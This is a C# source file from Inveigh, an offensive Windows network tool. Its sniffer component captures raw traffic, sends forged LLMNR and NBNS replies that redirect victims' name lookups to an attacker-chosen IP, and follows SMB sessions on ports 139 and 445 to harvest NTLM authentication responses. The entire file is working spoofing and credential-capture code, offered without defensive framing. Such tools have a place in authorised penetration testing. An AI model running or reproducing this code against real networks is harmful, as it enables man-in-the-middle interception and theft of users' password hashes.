using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Collections;
using System.Text.RegularExpressions;
using System.Security.Principal;

namespace Inveigh
{
    class Sniffer
    {
        static Hashtable tcpSessionTable = Hashtable.Synchronized(new Hashtable());

        public static void SnifferSpoofer(string snifferIP, string spooferIP, bool enabledLLMNR, bool enabledNBNS, string[] nbnsTypes, bool enabledSMB, bool enabledFileOutput, bool enabledSpooferRepeat, bool enabledMachineAccounts)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            Socket snifferSocket;
            byte[] byteIn = new byte[4] { 1, 0, 0, 0 };
            byte[] byteOut = new byte[4] { 1, 0, 0, 0 };
            byte[] byteData = new byte[4096];
            snifferSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
            snifferSocket.ReceiveBufferSize = 4096;
            IPEndPoint snifferEndPoint;
            snifferEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
            snifferSocket.Bind(snifferEndPoint);
            snifferSocket.IOControl(IOControlCode.ReceiveAll, byteIn, byteOut);
            int packetData;

            while (true)
            {

                try
                {
                    packetData = snifferSocket.Receive(byteData, 0, byteData.Length, SocketFlags.None);
                }
                catch
                {
                    packetData = 0;
                }

                if (packetData > 0)
                {
                    MemoryStream memoryStream = new MemoryStream(byteData, 0, packetData);
                    BinaryReader binaryReader = new BinaryReader(memoryStream);
                    byte versionHL = binaryReader.ReadByte();
                    binaryReader.ReadByte();
                    uint totalLength = Common.DataToUInt16(binaryReader.ReadBytes(2));
                    binaryReader.ReadBytes(5);
                    byte protocolNumber = binaryReader.ReadByte();
                    binaryReader.ReadBytes(2);
                    byte[] sourceIP = binaryReader.ReadBytes(4);
                    IPAddress sourceIPAddress = new IPAddress(sourceIP);
                    byte[] destinationIP = binaryReader.ReadBytes(4);
                    IPAddress destinationIPAddress = new IPAddress(destinationIP);
                    byte headerLength = versionHL;
                    headerLength <<= 4;
                    headerLength >>= 4;
                    headerLength *= 4;

                    switch (protocolNumber)
                    {
                        case 6:
                            uint tcpSourcePort = Common.DataToUInt16(binaryReader.ReadBytes(2));
                            uint tcpDestinationPort = Common.DataToUInt16(binaryReader.ReadBytes(2));
                            binaryReader.ReadBytes(8);
                            byte tcpHeaderLength = binaryReader.ReadByte();
                            tcpHeaderLength >>= 4;
                            tcpHeaderLength *= 4;
                            byte tcpFlags = binaryReader.ReadByte();
                            binaryReader.ReadBytes(7);
                            int tcpPayloadLength = (int)totalLength - (int)headerLength - (int)tcpHeaderLength;
                            byte[] payloadBytes = binaryReader.ReadBytes(tcpPayloadLength);
                            string challenge = "";
                            string session = "";
                            string tcpSession = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);
                            string tcpFlagsBinary = Convert.ToString(tcpFlags, 2);
                            tcpFlagsBinary = tcpFlagsBinary.PadLeft(8, '0');

                            if(String.Equals(tcpFlagsBinary.Substring(6,1),"1") && String.Equals(tcpFlagsBinary.Substring(3, 1),"0") && destinationIPAddress.ToString() == snifferIP)
                            {

                                lock (Program.outputList)
                                {
                                    Program.outputList.Add(String.Format("[+] {0} TCP({1}) SYN packet received from {2}", DateTime.Now.ToString("s"), tcpDestinationPort, tcpSession));
                                }

                            }

                            switch (tcpDestinationPort)
                            {
                                case 139:

                                    if (payloadBytes.Length > 0)
                                    {
                                        SMBConnection(payloadBytes, snifferIP, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "139");
                                    }

                                    session = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);

                                    if (Program.smbSessionTable.ContainsKey(session) && enabledSMB)
                                    {
                                        NTLM.GetNTLMResponse(payloadBytes, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "SMB", enabledFileOutput, enabledSpooferRepeat, snifferIP, enabledMachineAccounts);
                                    }

                                    break;

                                case 445:

                                    if (payloadBytes.Length > 0)
                                    {
                                        SMBConnection(payloadBytes, snifferIP, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "445");
                                    }

                                    session = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);

                                    if (Program.smbSessionTable.ContainsKey(session) && enabledSMB)
                                    {
                                        NTLM.GetNTLMResponse(payloadBytes, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "SMB", enabledFileOutput, enabledSpooferRepeat, snifferIP, enabledMachineAccounts);
                                    }

                                    break;
                            }

                            switch (tcpSourcePort)
                            {
                                case 139:

                                    if (payloadBytes.Length > 0)
                                    {
                                        challenge = NTLM.GetSMBNTLMChallenge(payloadBytes);
                                    }

                                    session = destinationIPAddress.ToString() + ":" + Convert.ToString(tcpDestinationPort);

                                    if (!string.IsNullOrEmpty(challenge) && destinationIP != sourceIP)
                                    {
                                        Program.smbSessionTable[session] = challenge;
                                    }

                                    break;

                                case 445:

                                    if (payloadBytes.Length > 0)
                                    {
                                        challenge = NTLM.GetSMBNTLMChallenge(payloadBytes);
                                    }

                                    session = destinationIPAddress.ToString() + ":" + Convert.ToString(tcpDestinationPort);

                                    if (!string.IsNullOrEmpty(challenge) && destinationIP != sourceIP)
                                    {
                                        Program.smbSessionTable[session] = challenge;
                                    }

                                    break;
                            }

                            break;

                        case 17:
                            byte[] udpSourcePort = binaryReader.ReadBytes(2);
                            uint endpointSourcePort = Common.DataToUInt16(udpSourcePort);
                            uint udpDestinationPort = Common.DataToUInt16(binaryReader.ReadBytes(2));
                            uint udpLength = Common.DataToUInt16(binaryReader.ReadBytes(2));
                            binaryReader.ReadBytes(2);
                            byte[] udpPayload;

                            try
                            {
                                udpPayload = binaryReader.ReadBytes(((int)udpLength - 2) * 4);
                            }
                            catch
                            {
                                udpPayload = new byte[2];
                            }

                            switch (udpDestinationPort)
                            {
                                case 137:

                                    byte[] nbnsQuestionsAnswerRRs = new byte[4];
                                    System.Buffer.BlockCopy(udpPayload, 4, nbnsQuestionsAnswerRRs, 0, 4);
                                    byte[] nbnsAdditionalRRs = new byte[2];
                                    System.Buffer.BlockCopy(udpPayload, 10, nbnsAdditionalRRs, 0, 2);

                                    if (BitConverter.ToString(nbnsQuestionsAnswerRRs) == "00-01-00-00" && BitConverter.ToString(nbnsAdditionalRRs) != "00-01")
                                    {
                                        string nbnsResponseMessage = "";
                                        udpLength += 12;
                                        byte[] nbnsTransactionID = new byte[2];
                                        byte[] nbnsTTL = { 0x00, 0x00, 0x00, 0xa5 };
                                        System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
                                        byte[] nbnsRequestType = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
                                        string nbnsQueryType = NBNS.NBNSQueryType(nbnsRequestType);
                                        byte[] nbnsRequest = new byte[udpPayload.Length - 20];
                                        System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
                                        string nbnsRequestHost = NBNS.BytesToNBNSQuery(nbnsRequest);
                                        nbnsResponseMessage = Common.CheckRequest(nbnsRequestHost, sourceIPAddress.ToString());

                                        if (enabledNBNS && String.Equals(nbnsResponseMessage, "response sent"))
                                        {
                                           
                                            if (Array.Exists(nbnsTypes, element => element == nbnsQueryType))
                                            {

                                                using (MemoryStream ms = new MemoryStream())
                                                {
                                                    ms.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
                                                    ms.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
                                                    ms.Write(Common.IntToByteArray2((int)udpLength), 0, 2);
                                                    ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                    ms.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
                                                    ms.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
                                                    ms.Write(nbnsRequest, 0, nbnsRequest.Length);
                                                    ms.Write(nbnsRequestType, 0, 2);
                                                    ms.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
                                                    ms.Write(nbnsTTL, 0, 4);
                                                    ms.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
                                                    ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                    ms.ToArray();
                                                    Socket nbnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                                    nbnsSendSocket.SendBufferSize = 1024;
                                                    IPEndPoint nbnsEndPoint = new IPEndPoint(sourceIPAddress, 137);
                                                    nbnsSendSocket.SendTo(ms.ToArray(), nbnsEndPoint);
                                                    nbnsSendSocket.Close();
                                                }

                                            }
                                            else
                                            {
                                                nbnsResponseMessage = "NBNS type disabled";
                                            }

                                        }

                                        lock (Program.outputList)
                                        {
                                            Program.outputList.Add(String.Format("[+] {0} NBNS request for {1}<{2}> received from {3} [{4}]", DateTime.Now.ToString("s"), nbnsRequestHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
                                        }

                                    }
                                    break;

                                case 5353:
                                    break;

                                case 5355:
                                    string llmnrResponseMessage = "";
                                    byte[] llmnrType = new byte[2];
                                    System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);

                                    if (BitConverter.ToString(llmnrType) != "00-1C")
                                    {
                                        udpLength += (byte)(udpPayload.Length - 2);
                                        Array.Reverse(udpSourcePort);
                                        byte[] llmnrTTL = { 0x00, 0x00, 0x00, 0x1e };
                                        byte[] llmnrTransactionID = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
                                        byte[] llmnrRequest = new byte[udpPayload.Length - 18];
                                        byte[] llmnrRequestLength = new byte[1];
                                        System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
                                        System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
                                        string llmnrRequestHost = System.Text.Encoding.UTF8.GetString(llmnrRequest);
                                        llmnrResponseMessage = Common.CheckRequest(llmnrRequestHost, sourceIPAddress.ToString());

                                        if (enabledLLMNR && String.Equals(llmnrResponseMessage, "response sent"))
                                        {

                                            using (MemoryStream ms = new MemoryStream())
                                            {
                                                ms.Write((new byte[2] { 0x14, 0xeb }), 0, 2);
                                                ms.Write(udpSourcePort, 0, 2);
                                                ms.Write(Common.IntToByteArray2((int)udpLength), 0, 2);
                                                ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                ms.Write(llmnrTransactionID, 0, llmnrTransactionID.Length);
                                                ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                                ms.Write(llmnrRequestLength, 0, 1);
                                                ms.Write(llmnrRequest, 0, llmnrRequest.Length);
                                                ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
                                                ms.Write(llmnrRequestLength, 0, 1);
                                                ms.Write(llmnrRequest, 0, llmnrRequest.Length);
                                                ms.Write((new byte[5] { 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 5);
                                                ms.Write(llmnrTTL, 0, 4);
                                                ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                                ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                ms.ToArray();
                                                Socket llmnrSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                                llmnrSendSocket.SendBufferSize = 1024;
                                                IPEndPoint llmnrEndPoint = new IPEndPoint(sourceIPAddress, (int)endpointSourcePort);
                                                llmnrSendSocket.SendTo(ms.ToArray(), llmnrEndPoint);
                                                llmnrSendSocket.Close();
                                            }

                                        }

                                        lock (Program.outputList)
                                        {
                                            Program.outputList.Add(String.Format("[+] {0} LLMNR request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), llmnrRequestHost, sourceIPAddress, llmnrResponseMessage));
                                        }

                                    }
                                    break;

                            }

                            break;
                    }

                }

            }

        }

        public static void SMBConnection(byte[] field, string IP, string sourceIP, string sourcePort, string port)
        {
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            string session = sourceIP + ":" + sourcePort;
            int index = payload.IndexOf("FF534D42");

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 8), 2) == "72" && IP != sourceIP)
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] {0} SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), port, session));
                }

            }

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0)
            {
                Program.smbSessionTable.Add(session, "");
            }

            index = payload.IndexOf("FE534D42");

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 24), 4) == "0000" && IP != sourceIP)
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] {0} SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), port, session));
                }

            }

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0)
            {
                Program.smbSessionTable.Add(session, "");
            }

            index = payload.IndexOf("2A864886F7120102020100");

            if (index > 0)
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] {0} SMB({1}) authentication method is Kerberos for {2}", DateTime.Now.ToString("s"), port, session));
                }

            }

        }

    }
}
